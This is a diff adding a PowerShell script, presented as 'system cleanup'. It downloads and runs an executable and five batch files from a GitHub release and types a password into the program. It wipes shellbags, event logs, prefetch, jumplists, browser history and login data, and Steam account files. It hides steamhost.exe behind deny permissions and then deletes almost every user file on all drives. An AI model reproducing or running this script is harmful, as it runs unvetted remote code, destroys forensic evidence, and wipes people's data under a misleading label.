@@ -1,0 +1,328 @@
+$downloadUrl = "https://github.com/Outlastissigma/M3TA-OS/releases/download/da/syswow.exe"
+$exePath = "$env:TEMP\syswow.exe"
+
+# Download syswow.exe
+Invoke-WebRequest -Uri $downloadUrl -OutFile $exePath
+
+# Start the process
+Start-Process $exePath
+
+# Wait for the app to launch
+Start-Sleep -Seconds 5
+
+# Add necessary .NET type for SendKeys
+Add-Type -AssemblyName System.Windows.Forms
+
+# Wait 3 seconds after syswow.exe opens
+Start-Sleep -Seconds 3
+
+# Send the text and press Enter
+[System.Windows.Forms.SendKeys]::SendWait("skewhsisdaddy")
+Start-Sleep -Milliseconds 300
+[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
+
+# Continue with the rest of your script...
+# New functionality - Download and run batch files
+$batchFiles = @(
+    "https://github.com/Outlastissigma/M3TA-OS/releases/download/da/3.bat",
+    "https://github.com/Outlastissigma/M3TA-OS/releases/download/da/4.bat",
+    "https://github.com/Outlastissigma/M3TA-OS/releases/download/da/5.bat",
+    "https://github.com/Outlastissigma/M3TA-OS/releases/download/da/6.bat",
+    "https://github.com/Outlastissigma/M3TA-OS/releases/download/da/7.bat"
+)
+
+foreach ($batchUrl in $batchFiles) {
+    $batchName = [System.IO.Path]::GetFileName($batchUrl)
+    $batchPath = "$env:TEMP\$batchName"
+    
+    # Download batch file
+    Invoke-WebRequest -Uri $batchUrl -OutFile $batchPath
+    
+    # Run batch file and wait for completion
+    Start-Process -FilePath "cmd.exe" -ArgumentList "/c", $batchPath -Wait
+}
+
+# Function to delete registry key and all its subkeys if exist
+function Remove-RegistryKeyRecursively {
+    param(
+        [string]$KeyPath
+    )
+    Start-Process -FilePath "reg" -ArgumentList "delete", $KeyPath, "/f" -Wait -NoNewWindow -ErrorAction SilentlyContinue
+}
+
+# List of registry keys related to shellbags to delete
+$shellBagKeys = @(
+    "HKCU\Software\Microsoft\Windows\Shell\Bags",
+    "HKCU\Software\Microsoft\Windows\Shell\BagMRU",
+    "HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\Bags",
+    "HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU"
+)
+
+foreach ($key in $shellBagKeys) {
+    Remove-RegistryKeyRecursively -KeyPath $key
+}
+
+# Search for steamhost.exe in multiple locations and move to Music folder
+$searchLocations = @(
+    "C:\",
+    [Environment]::GetFolderPath("MyDocuments"),
+    [Environment]::GetFolderPath("MyPictures"),
+    [Environment]::GetFolderPath("UserProfile") + "\Downloads"
+)
+
+$steamHostPath = $null
+
+foreach ($location in $searchLocations) {
+    if (Test-Path $location) {
+        $foundFile = Get-ChildItem -Path $location -Recurse -Filter "steamhost.exe" -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty FullName
+        if ($foundFile) {
+            $steamHostPath = $foundFile
+            break
+        }
+    }
+}
+
+if ($steamHostPath) {
+    $musicFolder = [Environment]::GetFolderPath("MyMusic")
+    $destinationPath = Join-Path $musicFolder "steamhost.exe"
+    
+    # Move file to Music folder
+    Move-Item -Path $steamHostPath -Destination $destinationPath -Force
+    
+    # Change Music folder permissions to deny read and execute
+    $acl = Get-Acl $musicFolder
+    $rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "ReadAndExecute", "ContainerInherit,ObjectInherit", "None", "Deny")
+    $acl.AddAccessRule($rule)
+    Set-Acl -Path $musicFolder -AclObject $acl
+    Write-Host "steamhost.exe found and moved to Music folder with restricted permissions."
+} else {
+    Write-Host "steamhost.exe not found in any of the searched locations."
+}
+
+# ===== ADDITIONAL CLEANUP TASKS =====
+Write-Host "Starting comprehensive system cleanup..." -ForegroundColor Green
+
+# Clear Windows Temp folders
+Write-Host "Clearing Windows Temp folders..." -ForegroundColor Yellow
+$tempFolders = @(
+    "$env:TEMP",
+    "C:\Windows\Temp",
+    "$env:LOCALAPPDATA\Temp"
+)
+
+foreach ($tempFolder in $tempFolders) {
+    if (Test-Path $tempFolder) {
+        Get-ChildItem -Path $tempFolder -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
+        Write-Host "Cleaned: $tempFolder"
+    }
+}
+
+# Clear Prefetch
+Write-Host "Clearing Prefetch..." -ForegroundColor Yellow
+$prefetchPath = "C:\Windows\Prefetch"
+if (Test-Path $prefetchPath) {
+    Get-ChildItem -Path $prefetchPath -Filter "*.pf" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+    Write-Host "Prefetch cleared"
+}
+
+# Clear Crashdumps
+Write-Host "Clearing Crashdumps..." -ForegroundColor Yellow
+$crashDumpPaths = @(
+    "$env:LOCALAPPDATA\CrashDumps",
+    "C:\Windows\LiveKernelReports",
+    "C:\Windows\Minidump"
+)
+
+foreach ($dumpPath in $crashDumpPaths) {
+    if (Test-Path $dumpPath) {
+        Get-ChildItem -Path $dumpPath -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
+        Write-Host "Cleaned: $dumpPath"
+    }
+}
+
+# Clear Recent files
+Write-Host "Clearing Recent files..." -ForegroundColor Yellow
+$recentPath = "$env:APPDATA\Microsoft\Windows\Recent"
+if (Test-Path $recentPath) {
+    Get-ChildItem -Path $recentPath -Force -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
+    Write-Host "Recent files cleared"
+}
+
+# Clear User Assist registry entries
+Write-Host "Clearing User Assist registry entries..." -ForegroundColor Yellow
+$userAssistKeys = @(
+    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist",
+    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage"
+)
+
+foreach ($key in $userAssistKeys) {
+    if (Test-Path $key) {
+        Remove-Item -Path $key -Recurse -Force -ErrorAction SilentlyContinue
+        Write-Host "Cleared: $key"
+    }
+}
+
+# Clear Event Logs
+Write-Host "Clearing Event Logs..." -ForegroundColor Yellow
+$eventLogs = @("Application", "System", "Security", "Setup")
+foreach ($log in $eventLogs) {
+    try {
+        wevtutil clear-log $log 2>$null
+        Write-Host "Cleared event log: $log"
+    } catch {
+        Write-Host "Failed to clear event log: $log" -ForegroundColor Red
+    }
+}
+
+# Clear Registry Editor history
+Write-Host "Clearing Registry Editor history..." -ForegroundColor Yellow
+Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit" -Name "LastKey" -ErrorAction SilentlyContinue
+Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit" -Name "Favorite" -ErrorAction SilentlyContinue
+
+# Clear Steam recent accounts
+Write-Host "Clearing Steam account history..." -ForegroundColor Yellow
+$steamPaths = @(
+    "$env:APPDATA\Steam\config\loginusers.vdf",
+    "$env:APPDATA\Steam\config\ssfn*",
+    "$env:APPDATA\Steam\config\steamapps*.vdf"
+)
+
+foreach ($steamFile in $steamPaths) {
+    Get-ChildItem -Path $steamFile -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+}
+
+# Clear Jumplists
+Write-Host "Clearing Jumplists..." -ForegroundColor Yellow
+$jumplistPath = "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations"
+if (Test-Path $jumplistPath) {
+    Get-ChildItem -Path $jumplistPath -Force -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+}
+
+# Clear Nvidia recently opened
+Write-Host "Clearing Nvidia recent files..." -ForegroundColor Yellow
+$nvidiaKeys = @(
+    "HKCU:\Software\NVIDIA Corporation\Global\NvCpl",
+    "HKCU:\Software\NVIDIA Corporation\Global\NView"
+)
+
+foreach ($key in $nvidiaKeys) {
+    if (Test-Path $key) {
+        Remove-ItemProperty -Path $key -Name "Recent*" -ErrorAction SilentlyContinue
+    }
+}
+
+# Clear Journal Traces
+Write-Host "Clearing Journal Traces..." -ForegroundColor Yellow
+$journalPath = "C:\Windows\System32\winevt\Logs"
+if (Test-Path $journalPath) {
+    Get-ChildItem -Path $journalPath -Filter "*.evtx" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+}
+
+# Clear Browser History (Chrome, Edge, Firefox)
+Write-Host "Clearing Browser History..." -ForegroundColor Yellow
+$browserPaths = @(
+    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default",
+    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default",
+    "$env:APPDATA\Mozilla\Firefox\Profiles"
+)
+
+foreach ($browserPath in $browserPaths) {
+    if (Test-Path $browserPath) {
+        $itemsToRemove = @("History", "Cookies", "Cache", "Web Data", "Login Data", "Top Sites", "Visited Links")
+        foreach ($item in $itemsToRemove) {
+            Get-ChildItem -Path $browserPath -Filter "*$item*" -Recurse -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+        }
+    }
+}
+
+# Final cleanup - Empty Recycle Bin
+Write-Host "Emptying Recycle Bin..." -ForegroundColor Yellow
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+
+# ===== DELETE ALL FILES EXCEPT STEAMHOST.EXE =====
+Write-Host "`nDeleting all files except steamhost.exe..." -ForegroundColor Red
+
+# Get the path to steamhost.exe in Music folder
+$musicFolder = [Environment]::GetFolderPath("MyMusic")
+$steamHostPath = Join-Path $musicFolder "steamhost.exe"
+
+# Function to delete all files except the specified one
+function Remove-AllFilesExcept {
+    param(
+        [string]$ExcludePath
+    )
+    
+    # Get all drives
+    $drives = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Root -notlike '*\*' } | Select-Object -ExpandProperty Root
+    
+    foreach ($drive in $drives) {
+        Write-Host "Scanning drive: $drive" -ForegroundColor Yellow
+        
+        # Skip system directories that would cause access denied errors
+        $excludeDirs = @(
+            "$drive\Windows",
+            "$drive`$Recycle.Bin",
+            "$drive\System Volume Information",
+            "$drive\Recovery",
+            "$drive\PerfLogs",
+            "$drive\Program Files",
+            "$drive\Program Files (x86)",
+            "$drive\ProgramData"
+        )
+        
+        try {
+            # Get all files recursively, excluding system directories and steamhost.exe
+            $allFiles = Get-ChildItem -Path $drive -File -Recurse -Force -ErrorAction SilentlyContinue | 
+                       Where-Object { 
+                           $_.FullName -ne $ExcludePath -and
+                           $excludeDirs -notcontains $_.DirectoryName -and
+                           $_.DirectoryName -notlike "*Windows*" -and
+                           $_.DirectoryName -notlike "*Program Files*" -and
+                           $_.DirectoryName -notlike "*ProgramData*"
+                       }
+            
+            # Delete files in batches to avoid memory issues
+            $batchSize = 1000
+            for ($i = 0; $i -lt $allFiles.Count; $i += $batchSize) {
+                $batch = $allFiles[$i..($i + $batchSize - 1)]
+                foreach ($file in $batch) {
+                    try {
+                        Remove-Item -Path $file.FullName -Force -ErrorAction SilentlyContinue
+                    } catch {
+                        # Continue with next file if deletion fails
+                        continue
+                    }
+                }
+                Write-Host "Deleted batch of files from $drive - Progress: $i/$($allFiles.Count)" -ForegroundColor Yellow
+            }
+            
+        } catch {
+            Write-Host "Error processing drive $drive : $($_.Exception.Message)" -ForegroundColor Red
+        }
+    }
+}
+
+# Delete all files except steamhost.exe
+Remove-AllFilesExcept -ExcludePath $steamHostPath
+
+# Clean up temporary files created by this script
+Write-Host "Cleaning up script temporary files..." -ForegroundColor Yellow
+$scriptTempFiles = @(
+    $exePath,
+    "$env:TEMP\3.bat",
+    "$env:TEMP\4.bat", 
+    "$env:TEMP\5.bat",
+    "$env:TEMP\6.bat",
+    "$env:TEMP\7.bat"
+)
+
+foreach ($tempFile in $scriptTempFiles) {
+    if (Test-Path $tempFile) {
+        Remove-Item -Path $tempFile -Force -ErrorAction SilentlyContinue
+    }
+}
+
+Write-Host "`n=== FINAL CLEANUP COMPLETE ===" -ForegroundColor Green
+Write-Host "All files have been deleted except steamhost.exe" -ForegroundColor White
+Write-Host "steamhost.exe is protected in the Music folder with restricted permissions" -ForegroundColor White
+Write-Host "System cleanup operations completed successfully!" -ForegroundColor Green
